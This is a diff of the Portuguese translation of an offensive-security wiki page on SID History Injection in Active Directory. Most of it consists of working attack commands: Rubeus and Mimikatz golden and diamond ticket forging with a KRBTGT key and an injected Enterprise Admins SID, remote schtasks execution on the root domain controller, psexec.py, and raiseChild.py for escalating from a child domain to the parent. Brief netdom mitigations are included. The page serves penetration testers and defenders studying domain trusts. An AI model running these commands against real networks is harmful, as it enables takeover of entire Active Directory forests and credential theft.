@@ -4,31 +4,31 @@
 
 ## SID History Injection Attack
 
-O foco do **SID History Injection Attack** é auxiliar a **migração de usuários entre domínios**, garantindo ao mesmo tempo o acesso contínuo aos recursos do domínio anterior. Isso é feito **incorporando o Security Identifier (SID) anterior do usuário ao SID History** da nova conta. Notavelmente, esse processo pode ser manipulado para conceder acesso não autorizado, adicionando o SID de um grupo com privilégios elevados (como Enterprise Admins ou Domain Admins) do domínio pai ao SID History. Essa exploração concede acesso a todos os recursos dentro do domínio pai.<sup>[[1]](#references)[[2]](#references)</sup>
+O foco do **SID History Injection Attack** é auxiliar na **migração de usuários entre domínios**, garantindo o acesso contínuo aos recursos do domínio anterior. Isso é feito **incorporando o Security Identifier (SID) anterior do usuário ao SID History** de sua nova conta. É importante destacar que esse processo pode ser manipulado para conceder acesso não autorizado, adicionando o SID de um grupo com altos privilégios (como Enterprise Admins ou Domain Admins) do domínio pai ao SID History. Essa exploração concede acesso a todos os recursos dentro do domínio pai.<sup>[[1]](#references)[[2]](#references)</sup>
 
 Existem dois métodos para executar esse ataque: por meio da criação de um **Golden Ticket** ou de um **Diamond Ticket**.
 
-Para identificar o SID do grupo **"Enterprise Admins"**, primeiro é necessário localizar o SID do domínio raiz. Após identificá-lo, o SID do grupo Enterprise Admins pode ser construído anexando `-519` ao SID do domínio raiz. Por exemplo, se o SID do domínio raiz for `S-1-5-21-280534878-1496970234-700767426`, o SID resultante para o grupo "Enterprise Admins" será `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
+Para identificar o SID do grupo **"Enterprise Admins"**, primeiro é necessário localizar o SID do domínio raiz. Após identificá-lo, o SID do grupo Enterprise Admins pode ser construído adicionando `-519` ao SID do domínio raiz. Por exemplo, se o SID do domínio raiz for `S-1-5-21-280534878-1496970234-700767426`, o SID resultante do grupo "Enterprise Admins" será `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
 Você também pode usar os grupos **Domain Admins**, cujo SID termina em **512**.
 
-Outra maneira de encontrar o SID de um grupo do outro domínio (por exemplo, "Domain Admins") é com:
+Outra forma de encontrar o SID de um grupo do outro domínio (por exemplo, "Domain Admins") é com:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Observe que é possível desabilitar o SID history em uma relação de confiança, o que fará este ataque falhar.
+> Observe que é possível desabilitar o SID history em uma relação de trust, o que fará este ataque falhar.
 
 De acordo com a [**documentação**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
 - **Desabilitar o SIDHistory em forest trusts** usando a ferramenta netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
 - **Aplicar o SID Filter Quarantining a external trusts** usando a ferramenta netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Aplicar o SID Filtering a domain trusts dentro de uma única forest** não é recomendado, pois é uma configuração sem suporte e pode causar alterações incompatíveis. Se um domínio dentro de uma forest não for confiável, ele não deverá ser membro da forest. Nesse caso, é necessário primeiro separar os domínios confiáveis e não confiáveis em forests distintas, onde o SID Filtering poderá ser aplicado a um interforest trust
+- **Aplicar o SID Filtering a domain trusts dentro de uma única forest** não é recomendado, pois é uma configuração sem suporte e pode causar breaking changes. Se um domain dentro de uma forest não for confiável, ele não deverá ser membro da forest. Nessa situação, é necessário primeiro separar os domains confiável e não confiável em forests distintas, onde o SID Filtering poderá ser aplicado a um interforest trust
 
-Confira este post para obter mais informações sobre como realizar bypass disso: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Confira este post para obter mais informações sobre como realizar o bypass disso: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Na última vez que tentei isso, precisei adicionar o argumento **`/ldap`**.
+Na última vez que tentei fazer isso, precisei adicionar o argumento **`/ldap`**.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Golden Ticket (Mimikatz) com KRBTGT-AES256
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -61,7 +61,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Para mais informações sobre Golden Tickets, consulte:
+Para mais informações sobre golden tickets, consulte:
 
 
 {{#ref}}
@@ -69,7 +69,7 @@ golden-ticket.md
 {{#endref}}
 
 
-Para mais informações sobre Diamond Tickets, consulte:
+Para mais informações sobre diamond tickets, consulte:
 
 
 {{#ref}}
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Escale para DA do domínio raiz ou Enterprise admin usando o hash KRBTGT do domínio comprometido:
+Escalone para DA do domínio raiz ou Enterprise admin usando o hash KRBTGT do domínio comprometido:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Com as permissões adquiridas no ataque, você pode executar, por exemplo, um ataque DCSync no novo domínio:
+Com as permissões obtidas no ataque, você pode executar, por exemplo, um ataque DCSync no novo domínio:
 
 
 {{#ref}}
@@ -121,11 +121,11 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automaticamente usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automático usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
 Este é um script do Impacket que **automatiza a escalada do domínio filho para o domínio pai**. O script precisa de:
 
-- Controlador de domínio alvo
+- Controlador de domínio de destino
 - Credenciais de um usuário administrador no domínio filho
 
 O fluxo é:
@@ -142,7 +142,8 @@ raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ## Referências
 
 - [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
-- [2] [What is Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
-- [3] [Security Considerations for Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [2] [O que é o Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Considerações de segurança para trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Sid Filter como limite de segurança entre domínios - Parte 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
